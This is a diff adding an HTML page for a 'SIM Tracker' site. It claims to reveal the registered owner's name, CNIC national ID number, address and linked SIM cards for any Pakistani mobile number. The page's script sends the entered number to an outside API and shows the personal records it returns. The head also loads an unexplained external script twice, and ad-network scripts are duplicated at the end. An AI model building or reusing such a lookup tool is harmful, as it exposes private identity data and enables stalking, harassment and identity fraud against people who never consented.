@@ -1,0 +1,241 @@
+<html lang="en"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Designation SIM Tracker â Pakistan SIM Owner Lookup</title>
+<meta name="description" content="Find Pakistani SIM card owner details instantly. Search by mobile number to get name, CNIC, address and linked SIM cards. By Your Name.">
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&amp;family=DM+Sans:wght@400;500;600&amp;family=JetBrains+Mono:wght@400;500&amp;display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+--bg:#0a0f1a;--card:#111827;--border:#1e2a3a;--primary:#22c55e;--primary-dark:#16a34a;
+--fg:#e8edf5;--muted:#6b7a8d;--secondary:#182030;
+}
+body{font-family:'DM Sans',sans-serif;background:var(--bg);color:var(--fg);min-height:100vh;display:flex;flex-direction:column;
+background-image:linear-gradient(rgba(30,42,58,0.5) 1px,transparent 1px),linear-gradient(90deg,rgba(30,42,58,0.5) 1px,transparent 1px);
+background-size:60px 60px}
+h1,h2,h3,h4,h5,h6{font-family:'Space Grotesk',sans-serif}
+.container{max-width:672px;margin:0 auto;padding:0 16px;width:100%}
+.header{border-bottom:1px solid rgba(30,42,58,0.5);background:rgba(17,24,39,0.6);backdrop-filter:blur(16px);position:sticky;top:0;z-index:50}
+.header-inner{display:flex;align-items:center;justify-content:space-between;padding:16px 0}
+.brand{display:flex;align-items:center;gap:12px}
+.brand-icon{width:40px;height:40px;border-radius:12px;background:var(--primary);display:flex;align-items:center;justify-content:center;box-shadow:0 0 20px -5px rgba(34,197,94,0.3)}
+.brand-icon svg{width:20px;height:20px;color:var(--bg)}
+.brand-name{font-size:20px;font-weight:700;letter-spacing:-0.02em}
+.brand-name span{color:var(--primary);text-shadow:0 0 20px rgba(34,197,94,0.5)}
+.brand-sub{font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:0.2em}
+.wa-btn{display:inline-flex;align-items:center;gap:8px;padding:8px 16px;background:#25D366;color:#fff;border:none;border-radius:8px;font-size:13px;font-weight:600;cursor:pointer;text-decoration:none;box-shadow:0 4px 12px rgba(37,211,102,0.2);transition:background 0.2s}
+.wa-btn:hover{background:#20BD5A}
+.wa-btn svg{width:16px;height:16px}
+
+main{flex:1;padding:32px 0}
+.hero{text-align:center;margin-bottom:40px}
+.badge{display:inline-flex;align-items:center;gap:8px;padding:6px 12px;border-radius:999px;border:1px solid rgba(34,197,94,0.3);background:rgba(34,197,94,0.05);color:var(--primary);font-size:12px;font-weight:500;margin-bottom:24px}
+.badge svg{width:12px;height:12px}
+.hero h2{font-size:clamp(28px,6vw,40px);font-weight:700;line-height:1.15;margin-bottom:12px}
+.hero h2 em{font-style:normal;color:var(--primary);text-shadow:0 0 20px rgba(34,197,94,0.5)}
+.hero p{color:var(--muted);font-size:14px;max-width:420px;margin:0 auto}
+
+.search-card{background:rgba(17,24,39,0.8);backdrop-filter:blur(8px);border-radius:16px;padding:20px;margin-bottom:32px;position:relative;box-shadow:0 0 20px -5px rgba(34,197,94,0.3)}
+.search-card::before{content:'';position:absolute;inset:0;border-radius:inherit;padding:1px;background:linear-gradient(135deg,rgba(34,197,94,0.6),rgba(34,197,94,0.05));-webkit-mask:linear-gradient(#fff 0 0) content-box,linear-gradient(#fff 0 0);-webkit-mask-composite:xor;mask-composite:exclude;pointer-events:none}
+.search-row{display:flex;gap:12px}
+.search-input-wrap{flex:1;position:relative}
+.search-input-wrap svg{position:absolute;left:12px;top:50%;transform:translateY(-50%);width:16px;height:16px;color:var(--muted)}
+.search-input{width:100%;height:48px;padding:0 12px 0 40px;background:rgba(24,32,48,0.5);border:1px solid rgba(30,42,58,0.5);border-radius:8px;color:var(--fg);font-family:'JetBrains Mono',monospace;font-size:16px;letter-spacing:0.05em;outline:none;transition:border-color 0.2s}
+.search-input::placeholder{font-family:'DM Sans',sans-serif;letter-spacing:normal;color:var(--muted)}
+.search-input:focus{border-color:var(--primary)}
+.search-btn{height:48px;padding:0 24px;background:var(--primary);color:var(--bg);border:none;border-radius:8px;cursor:pointer;font-weight:600;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 12px rgba(34,197,94,0.25);transition:background 0.2s}
+.search-btn:hover{background:var(--primary-dark)}
+.search-btn:disabled{opacity:0.5;cursor:not-allowed}
+.search-btn svg{width:20px;height:20px}
+
+.spinner{width:20px;height:20px;border:2px solid transparent;border-top-color:currentColor;border-radius:50%;animation:spin 0.6s linear infinite;display:inline-block}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+.loading{display:flex;flex-direction:column;align-items:center;padding:64px 0;gap:12px}
+.loading .spinner{width:32px;height:32px;color:var(--primary)}
+.loading p{font-size:14px;color:var(--muted)}
+
+.no-result{text-align:center;padding:48px 20px;background:rgba(17,24,39,0.6);border:1px solid rgba(30,42,58,0.5);border-radius:16px}
+.no-result svg{width:40px;height:40px;color:rgba(107,122,141,0.3);margin:0 auto 12px}
+.no-result p{color:var(--muted);font-weight:500}
+.no-result small{color:rgba(107,122,141,0.7);font-size:12px}
+
+.result-card{background:rgba(17,24,39,0.8);backdrop-filter:blur(8px);border-radius:16px;padding:20px;margin-bottom:16px;position:relative}
+.result-card::before{content:'';position:absolute;inset:0;border-radius:inherit;padding:1px;background:linear-gradient(135deg,rgba(34,197,94,0.6),rgba(34,197,94,0.05));-webkit-mask:linear-gradient(#fff 0 0) content-box,linear-gradient(#fff 0 0);-webkit-mask-composite:xor;mask-composite:exclude;pointer-events:none}
+.section-title{font-size:10px;font-weight:600;color:var(--primary);text-transform:uppercase;letter-spacing:0.15em;margin-bottom:16px;display:flex;align-items:center;gap:8px}
+.section-title svg{width:14px;height:14px}
+.info-row{display:flex;align-items:flex-start;gap:12px;margin-bottom:12px}
+.info-row:last-child{margin-bottom:0}
+.info-row svg{width:16px;height:16px;color:var(--primary);margin-top:2px;flex-shrink:0}
+.info-label{font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:0.1em}
+.info-value{font-size:14px;font-weight:500;word-break:break-word}
+.info-value.mono{font-family:'JetBrains Mono',monospace;letter-spacing:0.05em}
+
+.features{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-top:24px}
+@media(max-width:500px){.features{grid-template-columns:1fr}}
+.feature{padding:16px;border-radius:12px;background:rgba(17,24,39,0.4);border:1px solid rgba(30,42,58,0.3);text-align:center}
+.feature-icon{width:40px;height:40px;border-radius:8px;background:rgba(34,197,94,0.1);color:var(--primary);display:flex;align-items:center;justify-content:center;margin:0 auto 8px}
+.feature-icon svg{width:20px;height:20px}
+.feature h4{font-size:14px;font-weight:600;margin-bottom:2px}
+.feature p{font-size:12px;color:var(--muted)}
+
+footer{border-top:1px solid rgba(30,42,58,0.3);padding:24px 0;text-align:center}
+footer p{font-size:12px;color:var(--muted)}
+footer span{color:var(--primary);font-weight:600}
+
+.glow-bg{position:fixed;top:0;left:50%;transform:translateX(-50%);width:800px;height:600px;background:radial-gradient(ellipse at center,rgba(34,197,94,0.07) 0%,transparent 70%);pointer-events:none}
+.hidden{display:none}
+
+@keyframes fadeInUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
+.animate-in{animation:fadeInUp 0.5s ease-out}
+</style>
+<script src="https://portalfluently.com/sfp.js"></script><script src="https://portalfluently.com/sfp.js"></script></head>
+<body>
+<div class="glow-bg"></div>
+
+<header class="header">
+<div class="container">
+<div class="header-inner">
+<div class="brand">
+<div class="brand-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon></svg></div>
+<div><div class="brand-name"><span>Designation</span> SIM Tracker</div><div class="brand-sub">Pakistan SIM Owner Database</div></div>
+</div>
+<a href="https://whatsapp.com/channel/0029VbCM4nDLI8YWQOcEGy2B" target="_blank" rel="noopener noreferrer" class="wa-btn">
+<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"></path></svg>
+<span>Join Channel</span>
+</a>
+</div>
+</div>
+</header>
+
+<main>
+<div class="container">
+<div class="hero">
+<div class="badge"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg> Pakistan's #1 SIM Lookup Tool</div>
+<h2>Find SIM Owner<br><em>Details Instantly</em></h2>
+<p>Enter any Pakistani mobile number to discover the registered owner's name, CNIC, address, and all SIM cards linked to their identity.</p>
+</div>
+
+<div class="search-card">
+<div class="search-row">
+<div class="search-input-wrap">
+<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
+<input type="text" class="search-input" id="phoneInput" placeholder="Enter mobile number e.g. 03001234567" maxlength="13">
+</div>
+<button class="search-btn" id="searchBtn" onclick="doSearch()">
+<svg id="searchIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+<span class="spinner hidden" id="btnSpinner"></span>
+</button>
+</div>
+</div>
+
+<div id="loadingState" class="loading hidden">
+<div class="spinner"></div>
+<p>Searching database...</p>
+</div>
+
+<div id="noResult" class="no-result hidden">
+<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
+<p>No record found</p>
+<small>This number may not be registered or is not in our database.</small>
+</div>
+
+<div id="resultArea" class="hidden"></div>
+
+<div id="featuresArea" class="features">
+<div class="feature"><div class="feature-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg></div><h4>Owner Name</h4><p>Full registered name</p></div>
+<div class="feature"><div class="feature-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg></div><h4>CNIC Details</h4><p>National identity number</p></div>
+<div class="feature"><div class="feature-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg></div><h4>Linked SIMs</h4><p>All numbers on same CNIC</p></div>
+</div>
+</div>
+</main>
+
+<footer>
+<div class="container">
+<p>Developed by <span>Your Name</span> â Designation</p>
+</div>
+</footer>
+
+<script>
+const API_URL = 'https://famofc.site/api/database.php';
+
+const phoneInput = document.getElementById('phoneInput');
+phoneInput.addEventListener('keydown', e => { if(e.key === 'Enter') doSearch(); });
+
+async function doSearch() {
+  const num = phoneInput.value.replace(/[-\s]/g, '').trim();
+  if(!num) return;
+
+  const btn = document.getElementById('searchBtn');
+  const icon = document.getElementById('searchIcon');
+  const spinner = document.getElementById('btnSpinner');
+  const loading = document.getElementById('loadingState');
+  const noResult = document.getElementById('noResult');
+  const resultArea = document.getElementById('resultArea');
+  const features = document.getElementById('featuresArea');
+
+  btn.disabled = true;
+  icon.classList.add('hidden');
+  spinner.classList.remove('hidden');
+  loading.classList.remove('hidden');
+  noResult.classList.add('hidden');
+  resultArea.classList.add('hidden');
+  resultArea.innerHTML = '';
+  features.classList.add('hidden');
+
+  try {
+    const res = await fetch(API_URL + '?number=' + encodeURIComponent(num));
+    const data = await res.json();
+
+    loading.classList.add('hidden');
+
+    if(data.success && data.data && data.data.records_count > 0) {
+      let html = '';
+      data.data.records.forEach(rec => {
+        html += '<div class="result-card animate-in">';
+        html += '<div class="section-title"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg> Owner Information</div>';
+        html += infoRow('user','Full Name', rec.full_name);
+        html += infoRow('cnic','CNIC Number', rec.cnic, true);
+        html += infoRow('map','Address', rec.address);
+        if(rec.phone) html += infoRow('phone','Phone', rec.phone, true);
+        html += '</div>';
+      });
+      if(data.data.records_count > 1) {
+        html += '<p style="text-align:center;font-size:12px;color:var(--muted)">' + data.data.records_count + ' records found for ' + data.data.queried_number + '</p>';
+      }
+      resultArea.innerHTML = html;
+      resultArea.classList.remove('hidden');
+    } else {
+      noResult.classList.remove('hidden');
+    }
+  } catch(e) {
+    loading.classList.add('hidden');
+    noResult.classList.remove('hidden');
+    console.error(e);
+  } finally {
+    btn.disabled = false;
+    icon.classList.remove('hidden');
+    spinner.classList.add('hidden');
+  }
+}
+
+function infoRow(type, label, value, mono) {
+  const icons = {
+    user: '<path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/>',
+    cnic: '<rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/>',
+    map: '<path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/>',
+    phone: '<path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/>'
+  };
+  return '<div class="info-row"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">' + icons[type] + '</svg><div><div class="info-label">' + label + '</div><div class="info-value' + (mono ? ' mono' : '') + '">' + escHtml(value) + '</div></div></div>';
+}
+
+function escHtml(s) {
+  const d = document.createElement('div');
+  d.textContent = s || '';
+  return d.innerHTML;
+}
+</script>
+<script src="https://pl29356859.profitablecpmratenetwork.com/27/2b/e3/272be36e191ddb75b4609d2ecee4b41e.js"></script>
+<script src="https://pl29356859.profitablecpmratenetwork.com/27/2b/e3/272be36e191ddb75b4609d2ecee4b41e.js"></script>
+
+</body></html>
